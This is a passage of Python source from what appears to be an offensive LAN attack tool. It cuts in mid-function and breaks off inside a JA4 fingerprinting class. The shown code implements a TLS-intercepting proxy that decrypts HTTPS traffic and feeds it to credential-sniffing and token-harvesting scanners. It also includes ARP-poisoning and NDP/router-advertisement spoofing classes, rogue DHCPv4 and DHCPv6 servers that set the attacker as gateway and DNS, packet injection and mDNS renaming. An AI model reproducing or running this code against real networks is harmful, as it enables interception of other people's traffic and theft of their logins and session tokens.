                                                 f"cert-reject: {e}"))
                        d = STATE.devices.get(addr[0])
                        if d: d.proxy_pinned += 1
                else:
                    with STATE.lock:
                        STATE.mitm_errors.append((time.time(),
                            f"tls wrap fail {sni}: {e}"))
                        STATE.proxy_stats["errors"] += 1
                try: cli.close()
                except Exception: pass
                return
            except Exception as e:
                with STATE.lock:
                    STATE.mitm_errors.append((time.time(),
                        f"tls wrap fail {sni}: {e}"))
                try: cli.close()
                except Exception: pass
                return
            upstream_ctx = ssl.create_default_context()
            upstream_ctx.check_hostname = False
            upstream_ctx.verify_mode = ssl.CERT_NONE
            try:
                raw_up = socket.create_connection((sni, 443), timeout=10)
                raw_up.settimeout(CONFIG.get("proxy_upstream_timeout_s", 30.0))
                upstream = upstream_ctx.wrap_socket(raw_up, server_hostname=sni)
            except Exception as e:
                with STATE.lock:
                    STATE.mitm_errors.append((time.time(),
                        f"upstream tls fail {sni}: {e}"))
                    STATE.proxy_stats["errors"] += 1
                try: tls_cli.close()
                except Exception: pass
                return
            with self._lock:
                self._flow_counter += 1
                flow_id = self._flow_counter
                self._active_flows[flow_id] = {
                    "ts": time.time(), "src": addr[0], "sport": addr[1],
                    "dst": sni, "dport": 443,
                    "proto": "HTTPS", "mode": "https", "outcome": "active",
                    "sni": sni, "bytes_in": 0, "bytes_out": 0,
                }
            with STATE.lock:
                STATE.tls_intercepts.append((time.time(), addr[0], sni,
                                              "accept"))
                STATE.dirty += 1
            key = (addr[0], addr[1], sni, 443)
            tls_cli.settimeout(1.0)
            upstream.settimeout(1.0)
            bytes_in = 0
            bytes_out = 0
            while self.running and STATE.running:
                try:
                    ready, _, _ = select.select([tls_cli, upstream], [], [], 1.0)
                except Exception: break
                if not ready: continue
                done = False
                for s in ready:
                    try:
                        chunk = s.recv(CONFIG.get("proxy_buffer_size", 65536))
                    except Exception:
                        done = True; break
                    if not chunk:
                        done = True; break
                    if s is tls_cli:
                        bytes_in += len(chunk)
                        try: upstream.sendall(chunk)
                        except Exception:
                            done = True; break
                        if HTTP_PARSER:
                            HTTP_PARSER.feed(key, "req", chunk)
                        if CRED_SNIFF:
                            try: CRED_SNIFF.scan(chunk, addr[0], sni)
                            except Exception: pass
                        if TOKEN_HARVEST:
                            try: TOKEN_HARVEST.scan(chunk, addr[0], sni)
                            except Exception: pass
                        with STATE.lock:
                            STATE.tls_decrypted.append((time.time(), addr[0],
                                                          sni, "req",
                                                          len(chunk)))
                    else:
                        bytes_out += len(chunk)
                        try: tls_cli.sendall(chunk)
                        except Exception:
                            done = True; break
                        if HTTP_PARSER:
                            HTTP_PARSER.feed(key, "resp", chunk)
                        if CRED_SNIFF:
                            try: CRED_SNIFF.scan(chunk, addr[0], sni)
                            except Exception: pass
                        if TOKEN_HARVEST:
                            try: TOKEN_HARVEST.scan(chunk, addr[0], sni)
                            except Exception: pass
                        with STATE.lock:
                            STATE.tls_decrypted.append((time.time(), addr[0],
                                                          sni, "resp",
                                                          len(chunk)))
                if done: break
            try: upstream.close()
            except Exception: pass
            try: tls_cli.close()
            except Exception: pass
            with STATE.lock:
                STATE.proxy_stats["https"] += 1
                STATE.proxy_stats["bytes_in"] += bytes_in
                STATE.proxy_stats["bytes_out"] += bytes_out
                STATE.proxy_stats["active"] = len(self._active_flows)
                d = STATE.devices.get(addr[0])
                if d:
                    d.proxy_https_flows += 1
                    d.proxy_bytes_in += bytes_in
                    d.proxy_bytes_out += bytes_out
            with self._lock:
                if flow_id in self._active_flows:
                    rec = self._active_flows.pop(flow_id)
                    with STATE.lock:
                        STATE.mitm_flows.append((
                            rec["ts"], rec["src"], rec["dst"], rec["sport"],
                            rec["dport"], rec["proto"], sni, None,
                            None, None, None, bytes_in, bytes_out,
                            "https", "done"))
                        STATE.proxy_flows.append(rec)
        except Exception as e:
            with STATE.lock:
                STATE.mitm_errors.append((time.time(), f"https handler: {e}"))
                STATE.proxy_stats["errors"] += 1
            try: cli.close()
            except Exception: pass

    def start(self):
        if not self._gen_ca():
            console.log("[red]MITM proxy: CA generation failed[/]")
            return False
        try:
            self.http_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.http_listener.setsockopt(socket.SOL_SOCKET,
                                           socket.SO_REUSEADDR, 1)
            self.http_listener.bind(("0.0.0.0", self.http_port))
            self.http_listener.listen(64)
            self.http_listener.settimeout(1.0)
        except Exception as e:
            console.log(f"[red]MITM proxy HTTP bind :{self.http_port} "
                        f"failed: {e}[/]")
            self.http_listener = None
        try:
            self.https_listener = socket.socket(socket.AF_INET,
                                                 socket.SOCK_STREAM)
            self.https_listener.setsockopt(socket.SOL_SOCKET,
                                            socket.SO_REUSEADDR, 1)
            try:
                self.https_listener.setsockopt(socket.SOL_SOCKET,
                                                socket.SO_REUSEPORT, 1)
            except Exception: pass
            self.https_listener.bind(("0.0.0.0", self.https_port))
            self.https_listener.listen(64)
            self.https_listener.settimeout(1.0)
        except Exception as e:
            console.log(f"[red]MITM proxy HTTPS bind :{self.https_port} "
                        f"failed: {e}[/]")
            self.https_listener = None
        if not self.http_listener and not self.https_listener:
            console.log("[red]MITM proxy: no listeners could bind[/]")
            return False
        self.running = True
        if self.http_listener:
            threading.Thread(target=self._http_loop, daemon=True).start()
        if self.https_listener:
            threading.Thread(target=self._https_loop, daemon=True).start()
        self._install_nat()
        console.log(f"[green]MITM proxy online — HTTP:{self.http_port} "
                     f"HTTPS:{self.https_port} CA:{self._ca_cert}[/]")
        return True

    def stop(self):
        if not self.running: return
        self.running = False
        try:
            if self.http_listener: self.http_listener.close()
        except Exception: pass
        try:
            if self.https_listener: self.https_listener.close()
        except Exception: pass
        self._remove_nat()
        console.log("[green]MITM proxy stopped[/]")

class TLSIntercept:
    def __init__(self, ca_dir):
        self.ca_dir = ca_dir
        self.running = False
    def start(self):
        self.running = True
        return True
    def stop(self): self.running = False

class MITM:
    def __init__(self, iface, my_ip, my_mac, gateway_ip, gateway_mac):
        self.iface = iface; self.my_ip = my_ip; self.my_mac = my_mac
        self.gw_ip = gateway_ip; self.gw_mac = gateway_mac
        self.running = False
        self.targets = {}
        self._sock = None
        self._forward_was_on = False; self._rp_filter_prev = {}
        self._iptables_added = False
        self._ipv6_targets = {}

    def _open_sock(self):
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                              socket.htons(0x0003))
            s.bind((self.iface, 0)); return s
        except Exception as e:
            console.log(f"[red]MITM socket failed: {e}[/]"); return None

    def _build_arp_reply(self, src_mac, src_ip, dst_mac, dst_ip):
        eth = struct.pack("!6s6sH",
                          bytes.fromhex(dst_mac.replace(":", "")),
                          bytes.fromhex(src_mac.replace(":", "")), 0x0806)
        return (eth + struct.pack("!H", 1) + struct.pack("!H", 0x0800) +
                struct.pack("!B", 6) + struct.pack("!B", 4)
                + struct.pack("!H", 2) +
                bytes.fromhex(src_mac.replace(":", "")) +
                socket.inet_aton(src_ip) +
                bytes.fromhex(dst_mac.replace(":", "")) +
                socket.inet_aton(dst_ip))

    def _build_ra(self, victim_mac, lifetime=0):
        try:
            my_mac_b = bytes.fromhex(self.my_mac.replace(":", ""))
            vm = bytes.fromhex(victim_mac.replace(":", ""))
            src_ip6 = socket.inet_pton(socket.AF_INET6,
                                        "fe80::" + self.my_mac.replace(":", ""))
            dst_ip6 = socket.inet_pton(socket.AF_INET6, "ff02::1")
            payload = b"\x40"
            payload += b"\x00"
            payload += struct.pack("!H", lifetime)
            payload += struct.pack("!I", 0)
            payload += struct.pack("!I", 0)
            src_ll = struct.pack("!BB", 1, 1) + my_mac_b
            payload += src_ll
            icmp6 = struct.pack("!BBH", 134, 0, 0) + payload
            ip6 = struct.pack("!IHBB", 0x60000000, len(icmp6), 58, 255) \
                + src_ip6 + dst_ip6
            eth = struct.pack("!6s6sH", vm, my_mac_b, 0x86DD)
            return eth + ip6 + icmp6
        except Exception: return None

    def _enable_forward(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward") as f:
                self._forward_was_on = (f.read().strip() == "1")
            if not self._forward_was_on:
                sh("echo 1 > /proc/sys/net/ipv4/ip_forward")
        except Exception: return False
        for key in (f"net.ipv4.conf.{self.iface}.rp_filter",
                    "net.ipv4.conf.all.rp_filter"):
            try:
                cur = sh(f"sysctl -n {key}").strip()
                self._rp_filter_prev[key] = cur
                if cur != "0": sh(f"sysctl -w {key}=0 >/dev/null 2>&1")
            except Exception: pass
        try:
            if CONFIG.get("mitm_ipv6_enabled"):
                sh("sysctl -w net.ipv6.conf.all.forwarding=1 >/dev/null 2>&1")
                sh(f"sysctl -w net.ipv6.conf.{self.iface}.forwarding=1 "
                   f">/dev/null 2>&1")
                sh(f"sysctl -w net.ipv6.conf.{self.iface}.accept_ra=0 "
                   f">/dev/null 2>&1")
        except Exception: pass
        if sh("which iptables"):
            r1 = sh(f"iptables -C FORWARD -i {self.iface} "
                    f"-o {self.iface} -j ACCEPT 2>/dev/null; echo $?")
            if r1.strip() != "0":
                sh(f"iptables -I FORWARD 1 -i {self.iface} "
                   f"-o {self.iface} -j ACCEPT")
                self._iptables_added = True
        return True

    def _restore_kernel(self):
        for key, val in self._rp_filter_prev.items():
            try: sh(f"sysctl -w {key}={val} >/dev/null 2>&1")
            except Exception: pass
        if self._iptables_added and sh("which iptables"):
            try:
                sh(f"iptables -D FORWARD -i {self.iface} "
                   f"-o {self.iface} -j ACCEPT 2>/dev/null")
            except Exception: pass
        if not self._forward_was_on:
            sh("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def add_targets(self, targets):
        added = 0
        with STATE.lock:
            for ip, mac in targets:
                if not mac or mac == "?" or not MAC_RE.match(mac): continue
                if ip in (self.my_ip, self.gw_ip): continue
                if ip.startswith(("224.", "239.", "255.")): continue
                if ip in RESOLVER_IPS: continue
                if self.gw_mac and mac.lower() == self.gw_mac.lower(): continue
                if ip in self.targets: continue
                self.targets[ip] = {"mac": mac.lower(),
                                     "victim_ts": 0.0, "gateway_ts": 0.0}
                added += 1
                d = STATE.devices.get(ip)
                if d: d.mitm = True
        return added

    def add_ipv6_targets(self, targets):
        added = 0
        with STATE.lock:
            for ip, mac in targets:
                if not mac or mac == "?" or not MAC_RE.match(mac): continue
                if ip.startswith("::"): continue
                self._ipv6_targets[ip] = mac.lower()
                added += 1
        return added

    def _poison(self, v_ip, v_mac):
        try:
            if CONFIG.get("mitm_jitter"):
                time.sleep(random.uniform(0, 0.05))
            self._sock.send(self._build_arp_reply(
                src_mac=self.my_mac, src_ip=self.gw_ip,
                dst_mac=v_mac, dst_ip=v_ip))
            self._sock.send(self._build_arp_reply(
                src_mac=self.my_mac, src_ip=v_ip,
                dst_mac=self.gw_mac, dst_ip=self.gw_ip))
            if CONFIG.get("mitm_ipv6_enabled"):
                ra = self._build_ra(v_mac, lifetime=0)
                if ra:
                    try: self._sock.send(ra)
                    except Exception: pass
                    with STATE.lock:
                        STATE.ipv6_mitm.append((time.time(), v_ip))
            return True
        except Exception: return False

    def _poison_loop(self):
        started = time.time()
        while self.running:
            elapsed = time.time() - started
            with STATE.lock: entries = list(self.targets.items())
            for v_ip, entry in entries:
                now = time.time()
                stale = CONFIG.get("mitm_steady_interval_s", 2.0)
                if elapsed < CONFIG.get("mitm_burst_duration_s", 10.0):
                    stale = CONFIG.get("mitm_burst_interval_s", 0.4)
                if KALMAN_ARP:
                    stale = KALMAN_ARP.next_interval(v_ip, default=stale)
                if ((now - entry["victim_ts"] >= stale)
                    or (now - entry["gateway_ts"] >= stale)):
                    if self._poison(v_ip, entry["mac"]):
                        entry["victim_ts"] = now
                        entry["gateway_ts"] = now
            time.sleep(0.2)

    def _rescan_loop(self):
        while self.running:
            time.sleep(CONFIG.get("mitm_rescan_s", 17.0))
            if not self.running: return
            try:
                subnet = f"{CONFIG['my_ip']}/{CONFIG.get('netmask', 24)}"
                found = discover_devices(CONFIG["iface"], subnet, quiet=True)
                added = self.add_targets([(ip, m.get("mac"))
                                           for ip, m in found.items()])
                if added: console.log(f"[yellow]MITM: +{added} new targets[/]")
            except Exception: pass

    def start(self):
        if not self.my_mac or not MAC_RE.match(self.my_mac): return False
        if not self.gw_mac or not MAC_RE.match(self.gw_mac): return False
        if not self.targets: return False
        self._sock = self._open_sock()
        if not self._sock: return False
        if not self._enable_forward():
            try: self._sock.close()
            except Exception: pass
            return False
        self.running = True
        threading.Thread(target=self._poison_loop, daemon=True).start()
        threading.Thread(target=self._rescan_loop, daemon=True).start()
        console.log(f"[green]MITM active — {len(self.targets)} targets[/]")
        return True

    def stop(self):
        if not self.running: return
        self.running = False
        with STATE.lock: entries = list(self.targets.items())
        for v_ip, entry in entries:
            v_mac = entry["mac"]
            for _ in range(5):
                try:
                    self._sock.send(self._build_arp_reply(
                        src_mac=self.gw_mac, src_ip=self.gw_ip,
                        dst_mac=v_mac, dst_ip=v_ip))
                    self._sock.send(self._build_arp_reply(
                        src_mac=v_mac, src_ip=v_ip,
                        dst_mac=self.gw_mac, dst_ip=self.gw_ip))
                except Exception: pass
            time.sleep(0.05)
        try:
            if self._sock: self._sock.close()
        except Exception: pass
        self._sock = None
        self._restore_kernel()
        with STATE.lock:
            for ip in self.targets:
                d = STATE.devices.get(ip)
                if d: d.mitm = False
        console.log("[green]MITM stopped[/]")

class DHCPUDP:
    @staticmethod
    def build_dhcp_reply(xid, client_mac, yiaddr, msg_type=2):
        try:
            op=2; htype=1; hlen=6; hops=0; secs=0; flags=0
            ciaddr = b"\x00" * 4; yiaddr_b = socket.inet_aton(yiaddr)
            siaddr = socket.inet_aton(CONFIG["my_ip"]); giaddr = b"\x00" * 4
            chaddr = client_mac + b"\x00" * 10
            sname = b"\x00" * 64; file_ = b"\x00" * 128
            magic = b"\x63\x82\x53\x63"
            opts = bytearray()
            opts += bytes([53, 1, msg_type])
            opts += bytes([1, 4]) + socket.inet_aton("255.255.255.0")
            opts += bytes([3, 4]) + socket.inet_aton(CONFIG["my_ip"])
            opts += bytes([6, 4]) + socket.inet_aton(CONFIG["my_ip"])
            opts += bytes([15, len(b"lab")]) + b"lab"
            opts += bytes([54, 4]) + socket.inet_aton(CONFIG["my_ip"])
            opts += bytes([51, 4]) + struct.pack("!I", 3600)
            opts += bytes([255])
            header = struct.pack("!BBBBIHH4s4s4s4s", op, htype, hlen, hops,
                                  xid, secs, flags, ciaddr, yiaddr_b,
                                  siaddr, giaddr) + chaddr + sname + file_
            return header + magic + bytes(opts)
        except Exception: return None

class DHCPv4Server:
    def __init__(self, iface, my_ip, my_mac):
        self.iface = iface; self.my_ip = my_ip; self.my_mac = my_mac
        self.running = False; self.sock = None
    def start(self):
        try:
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                       socket.htons(0x0003))
            self.sock.bind((self.iface, 0))
        except Exception: return False
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]DHCPv4 rogue online[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.sock: self.sock.close()
        except Exception: pass
    def _loop(self):
        while self.running and STATE.running:
            try:
                frame = self.sock.recv(65535)
                eth = dpkt.ethernet.Ethernet(frame)
                if not isinstance(eth.data, dpkt.ip.IP): continue
                ip = eth.data
                if not isinstance(ip.data, dpkt.udp.UDP): continue
                udp = ip.data
                if udp.dport != 67: continue
                data = bytes(udp.data)
                if len(data) < 240: continue
                opts = data[240:]
                is_disc = False; is_req = False; opt_str = ""
                i = 0
                while i + 2 < len(opts):
                    code = opts[i]; ln = opts[i + 1]
                    val = opts[i + 2:i + 2 + ln]
                    if code == 53 and val:
                        if val[0] == 1: is_disc = True
                        elif val[0] == 3: is_req = True
                    if code == 55 and val:
                        opt_str = ",".join(str(b) for b in val)
                    if code == 255: break
                    i += 2 + ln
                if not (is_disc or is_req): continue
                client_mac = data[28:34]
                xid = struct.unpack("!I", data[4:8])[0]
                yiaddr = f"{'.'.join(CONFIG['my_ip'].split('.')[:3])}.100"
                reply = DHCPUDP.build_dhcp_reply(xid, client_mac, yiaddr,
                                                  2 if is_disc else 5)
                if reply is None: continue
                udp_out = struct.pack("!HHHH", 67, 68, 8 + len(reply), 0) + reply
                ip_out = struct.pack("!BBHHHBBH4s4s", 0x45, 0,
                                      20 + len(udp_out), 0, 0, 64, 17, 0,
                                      socket.inet_aton(CONFIG["my_ip"]),
                                      b"\xff\xff\xff\xff") + udp_out
                src_mac = bytes.fromhex(self.my_mac.replace(":", ""))
                eth_out = b"\xff" * 6 + src_mac + struct.pack("!H", 0x0800) \
                    + ip_out
                try:
                    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
                    s.bind((self.iface, 0)); s.send(eth_out); s.close()
                    mac_str = ":".join(f"{b:02x}" for b in client_mac)
                    fp = _dhcp_vendor_from_options(opt_str) if opt_str else None
                    with STATE.lock:
                        STATE.dhcp_leases.append((time.time(), mac_str,
                                                   yiaddr,
                                                   "OFFER" if is_disc else "ACK"))
                        if fp:
                            STATE.dhcp_fp_hits.append((time.time(), mac_str,
                                                        fp))
                        d = STATE.devices.get(socket.inet_ntoa(ip.src))
                        if d and fp: d.dhcp_fp = fp
                        STATE.dirty += 1
                except Exception: pass
            except Exception: pass

class DHCPv6Server:
    def __init__(self, iface, my_ip, my_mac):
        self.iface = iface; self.my_ip = my_ip; self.my_mac = my_mac
        self.running = False; self.sock = None
    def start(self):
        try:
            self.sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind(("::", 547))
            self.sock.settimeout(1.0)
        except Exception:
            return False
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]DHCPv6 rogue online[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.sock: self.sock.close()
        except Exception: pass
    def _build_reply(self, req, msg_type=7):
        try:
            if len(req) < 4: return None
            txid = req[1:4]
            opts = bytearray()
            server_duid = b"\x00\x03\x00\x01" \
                + bytes.fromhex(self.my_mac.replace(":", ""))
            opts += bytes([0x02, (len(server_duid) >> 8) & 0xff,
                           len(server_duid) & 0xff]) + server_duid
            client_duid = b"\x00\x03\x00\x01" \
                + bytes.fromhex(self.my_mac.replace(":", ""))
            opts += bytes([0x01, (len(client_duid) >> 8) & 0xff,
                           len(client_duid) & 0xff]) + client_duid
            iaid = req[4:8] if len(req) >= 8 else b"\x00" * 4
            ia_na = bytearray()
            ia_na += iaid
            ia_na += struct.pack("!II", 3600, 5400)
            iaaddr = bytearray()
            iaaddr += socket.inet_pton(socket.AF_INET6, "fd00:1::100")
            iaaddr += struct.pack("!II", 3600, 5400)
            ia_na += bytes([0x00, 0x05]) + struct.pack("!H", len(iaaddr)) \
                + bytes(iaaddr)
            opts += bytes([0x00, 0x03]) + struct.pack("!H", len(ia_na)) \
                + bytes(ia_na)
            return bytes([msg_type]) + txid + bytes(opts)
        except Exception: return None
    def _loop(self):
        while self.running and STATE.running:
            try:
                data, addr = self.sock.recvfrom(4096)
                if len(data) < 4: continue
                msg_type = data[0]
                if msg_type not in (1, 3): continue
                reply_type = 2 if msg_type == 1 else 7
                reply = self._build_reply(data, reply_type)
                if reply:
                    self.sock.sendto(reply, (addr[0], 546))
                    with STATE.lock:
                        STATE.dhcp_leases.append((time.time(), addr[0],
                                                   "dhcpv6",
                                                   f"type{msg_type}->{reply_type}"))
                        STATE.dirty += 1
            except socket.timeout: continue
            except Exception: pass

class RAServer:
    def __init__(self, iface, my_ip, my_mac):
        self.iface = iface; self.my_ip = my_ip; self.my_mac = my_mac
        self.running = False; self.sock = None
    def start(self):
        try:
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                       socket.htons(0x86DD))
            self.sock.bind((self.iface, 0))
        except Exception: return False
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]RA server online[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.sock: self.sock.close()
        except Exception: pass
    def _loop(self):
        while self.running and STATE.running:
            try:
                src_mac = bytes.fromhex(self.my_mac.replace(":", ""))
                src_ip6 = socket.inet_pton(socket.AF_INET6, "fe80::1")
                dst_ip6 = socket.inet_pton(socket.AF_INET6, "ff02::1")
                payload = b"\x40" + b"\x00" + struct.pack("!H", 1800)
                payload += struct.pack("!I", 0) + struct.pack("!I", 0)
                dns6 = socket.inet_pton(socket.AF_INET6, "fe80::1")
                rdnss = struct.pack("!BBH", 25, 3, 60) + dns6
                src_ll = struct.pack("!BB", 1, 1) + src_mac
                prefix = b"\x03\x04\x40\xc0" + struct.pack("!I", 86400) \
                    + struct.pack("!I", 14400) + b"\x00" * 4 \
                    + socket.inet_pton(socket.AF_INET6, "fd00:1::")[:8]
                payload += rdnss + src_ll + prefix
                icmp6 = struct.pack("!BBH", 134, 0, 0) + payload
                ip6 = struct.pack("!IHBB", 0x60000000, len(icmp6), 58, 255) \
                    + src_ip6 + dst_ip6
                eth = struct.pack("!6s6sH", b"\x33\x33\x00\x00\x00\x01",
                                   src_mac, 0x86DD)
                self.sock.send(eth + ip6 + icmp6)
                with STATE.lock: STATE.ra_sent += 1
            except Exception: pass
            time.sleep(8)

class NDPServer:
    def __init__(self, iface, my_ip, my_mac):
        self.iface = iface; self.my_ip = my_ip; self.my_mac = my_mac
        self.running = False; self.targets = {}
    def start(self):
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]NDP server online[/]")
        return True
    def stop(self): self.running = False
    def add(self, ip, mac): self.targets[ip] = mac
    def _loop(self):
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                              socket.htons(0x86DD))
            s.bind((self.iface, 0))
        except Exception: return
        while self.running and STATE.running:
            try:
                for ip, mac in list(self.targets.items()):
                    try:
                        mac_b = bytes.fromhex(mac.replace(":", ""))
                        my_mac_b = bytes.fromhex(self.my_mac.replace(":", ""))
                        src_ip6 = socket.inet_pton(socket.AF_INET6,
                            "fe80::" + self.my_mac.replace(":", ""))
                        dst_ip6 = socket.inet_pton(socket.AF_INET6, "ff02::1")
                        flags = struct.pack("!I", 0x60000000)
                        icmp6 = struct.pack("!BBH", 136, 0, 0)
                        icmp6 += flags + src_ip6 + b"\x02\x01" + my_mac_b
                        ip6 = struct.pack("!IHBB", 0x60000000, len(icmp6),
                                           58, 255) + src_ip6 + dst_ip6
                        eth = struct.pack("!6s6sH", mac_b, my_mac_b, 0x86DD)
                        s.send(eth + ip6 + icmp6)
                        with STATE.lock: STATE.ndp_sent += 1
                    except Exception: pass
            except Exception: pass
            time.sleep(5)
        try: s.close()
        except Exception: pass

class SMBMsg:
    def __init__(self, iface, my_ip, my_mac):
        self.iface = iface; self.my_ip = my_ip; self.my_mac = my_mac
        self.running = False; self.sock = None
    def start(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind(("0.0.0.0", 138))
            self.sock.settimeout(1.0)
        except Exception: self.sock = None
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log("[green]SMB msg online[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.sock: self.sock.close()
        except Exception: pass
    def _loop(self):
        while self.running and STATE.running:
            if not self.sock:
                time.sleep(1); continue
            try:
                data, addr = self.sock.recvfrom(4096)
                if data:
                    with STATE.lock:
                        STATE.smb_msgs.append((time.time(), addr[0],
                                                f"received {len(data)}B"))
                        STATE.dirty += 1
            except socket.timeout: continue
            except Exception: pass
    def send(self, target_ip, text):
        try:
            if not self.sock: return False
            payload = text.encode("utf-8", "ignore")[:512]
            header = struct.pack("!BBH", 0x00, 0x00, len(payload))
            self.sock.sendto(header + payload, (target_ip, 138))
            with STATE.lock:
                STATE.smb_msgs.append((time.time(), target_ip,
                                        f"sent: {text[:80]}"))
                STATE.dirty += 1
            return True
        except Exception:
            return False

class MDNSRename:
    def __init__(self, iface, my_ip, my_mac):
        self.iface = iface; self.my_ip = my_ip; self.my_mac = my_mac
        self.running = False; self.sock = None
    def start(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind(("0.0.0.0", 5353))
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
        except Exception: return False
        self.running = True
        console.log("[green]mDNS rename online[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.sock: self.sock.close()
        except Exception: pass
    def rename(self, hostname, new_name):
        try:
            q = dpkt.dns.DNS(id=random.randint(1, 65535), qr=1, aa=1)
            rr = dpkt.dns.DNS.RR(name=f"{hostname}.local", type=16,
                                   cls=1, ttl=120,
                                   rdata=new_name.encode())
            q.an.append(rr)
            self.sock.sendto(bytes(q), ("224.0.0.251", 5353))
            with STATE.lock:
                STATE.mdns_renames.append((time.time(), hostname, new_name))
                STATE.dirty += 1
            return True
        except Exception: return False

class Capture:
    ETH_P_ALL = 0x0003
    def __init__(self, iface, ring_size=50000):
        self.iface = iface; self.sock = None; self.running = False
        self._lock = threading.Lock()
        self.ring = deque(maxlen=ring_size); self.ring_lock = threading.Lock()
        self.frames_seen = 0; self.dropped = 0; self.last_error = None
    def start(self):
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                              socket.htons(self.ETH_P_ALL))
        except PermissionError:
            console.log("[red]Need root[/]"); return False
        except Exception as e:
            console.log(f"[red]socket() failed: {e}[/]"); return False
        try: s.bind((self.iface, 0))
        except Exception as e:
            console.log(f"[red]bind failed: {e}[/]"); return False
        try: s.settimeout(0.5)
        except Exception: pass
        self.sock = s; self.running = True
        return True
    def loop(self):
        while self.running and STATE.running:
            try: frame = self.sock.recv(65535)
            except socket.timeout: continue
            except Exception as e:
                self.last_error = str(e); time.sleep(0.2); continue
            self.frames_seen += 1
            ts = time.time()
            with self.ring_lock:
                try: self.ring.append((ts, frame))
                except Exception: self.dropped += 1
            try: process_frame(frame, ts)
            except Exception: pass
    def stop(self):
        with self._lock:
            if not self.running: return
            self.running = False
            try:
                if self.sock: self.sock.close()
            except Exception: pass
            self.sock = None
    def dump(self):
        try:
            with self.ring_lock: frames = list(self.ring)
            if not frames: return
            with open(CONFIG["save_pcap"], "wb") as f:
                f.write(struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0,
                                     65535, 1))
                for ts, frame in frames:
                    sec = int(ts); usec = int((ts - sec) * 1_000_000)
                    f.write(struct.pack("<IIII", sec, usec, len(frame),
                                         len(frame)))
                    f.write(frame)
            console.log(f"[green]dumped {len(frames)} frames[/]")
        except Exception as e:
            console.log(f"[red]pcap dump failed: {e}[/]")

def _tx_frame(iface, frame_bytes):
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((iface, 0))
        s.send(frame_bytes)
        s.close()
        with STATE.lock:
            STATE.tx_injections.append((time.time(), len(frame_bytes)))
            STATE.dirty += 1
        return True
    except Exception:
        return False

class JA4Engine:
    def __init__(self):
        self.proc = None; self.running = False
        self.on_fp = None
    def _tshark(self):
        if not CONFIG.get("tshark_enabled"): return None
        return CONFIG.get("ja4_tshark_path") or shutil.which("tshark")
    def start(self, iface, on_fp, testdata_dir=None, verbose=True):
        self.on_fp = on_fp
        tshark = self._tshark()
        if not tshark:
            self.running = True
            console.log("[green]JA4 pure-Python engine online (no tshark)[/]")
            return True
        cmd = [tshark, "-i", iface, "-T", "ek", "-n", "-l",
               "-o", "tls.desegment_ssl_records:TRUE",
               "-o", "tls.desegment_ssl_application_data:TRUE"]
        try:
            self.proc = Popen(cmd, stdout=PIPE, stderr=DEVNULL,
                              text=True, bufsize=1)
        except Exception:
            self.proc = None
            self.running = True
            console.log("[green]JA4 pure-Python engine online "
                        "(tshark launch failed)[/]")
            return True
        self.running = True
        threading.Thread(target=self._reader_loop, daemon=True).start()
        console.log("[green]JA4 engine online (tshark + pure-Python)[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.proc:
                self.proc.terminate()
                try: self.proc.wait(timeout=2)
                except Exception: self.proc.kill()
        except Exception: pass
    def _reader_loop(self):
        try:
            for line in iter(self.proc.stdout.readline, ''):
                if not self.running: break
                if '"layers"' not in line: continue
                try: pkt = json.loads(line)
                except Exception: continue
                try: self._packet_to_x(pkt)
                except Exception: pass
        except Exception: pass
    def _packet_to_x(self, pkt):
        layers = pkt.get('layers')
        if not layers: return
        protos = layers.get('frame_frame_protocols', '')
        if not protos: return
        x = {"protos": protos, "ts": time.time()}
        ip = layers.get('ip_ip_src') or layers.get('ipv6_ipv6_src')
        if ip: x['src'] = ip
        ip = layers.get('ip_ip_dst') or layers.get('ipv6_ipv6_dst')
        if ip: x['dst'] = ip
        for k in ('tcp_tcp_srcport', 'udp_udp_srcport'):
            if layers.get(k): x['srcport'] = layers[k]; break
        for k in ('tcp_tcp_dstport', 'udp_udp_dstport'):
            if layers.get(k): x['dstport'] = layers[k]; break
        for k in ('tcp_tcp_stream', 'udp_udp_stream', 'quic_quic_stream'):
            if layers.get(k): x['stream'] = int(layers[k]); break
        if 'stream' not in x: return
        if 'tls' in protos and layers.get('tls_tls_handshake_type'):
            try: ht_int = int(layers['tls_tls_handshake_type'])
            except Exception: ht_int = None
            sni = layers.get('tls_tls_handshake_extensions_server_name')
            if ht_int == 1:
                entry = {"stream": x['stream'], "src": x.get('src'),
                          "dst": x.get('dst'), "srcport": x.get('srcport'),
                          "dstport": x.get('dstport'), "hl": "tls",
                          "kind": "ja4", "ts": time.time(),
                          "domain": sni}
                if self.on_fp:
                    try: self.on_fp(entry, "ja4")
                    except Exception: pass
            elif ht_int == 2:
                entry = {"stream": x['stream'], "src": x.get('src'),
